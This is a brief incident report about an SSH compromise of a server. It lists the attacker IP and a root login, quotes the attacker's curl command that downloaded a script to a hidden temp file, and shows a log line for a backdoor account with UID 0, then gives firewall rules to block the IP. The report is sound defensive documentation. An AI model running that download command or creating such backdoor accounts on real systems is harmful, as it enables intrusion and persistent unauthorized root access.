# Incident Report: Unauthorized Access and System Compromise

## Executive Summary
An unauthorized intrusion occurred on `srv-auth-01` via SSH brute-force/credential compromise, leading to full root access. The attacker downloaded malicious payloads via `curl` and created a backdoor privileged user account (`svc-backup`).

## Attack Details & Evidence
* **Attacker IP:** `198.51.100.77`
* **Initial Access:** Successful SSH login as `root` at `2026-11-05 01:12:00` from `198.51.100.77`.
* **Post-Exploitation Activity:**
  * Downloaded external script: `sudo /usr/bin/curl -s http://198.51.100.77/x.sh -o /tmp/.x`
  * Created backdoor user with UID/GID 0: `useradd[7120]: new user: name=svc-backup, UID=0, GID=0`

## Containment & Firewall Rules
To block the attacker's IP address and prevent further communication, apply the following firewall rules:

```bash
iptables -A INPUT -s 198.51.100.77 -j DROP
ufw deny from 198.51.100.77 to any
```
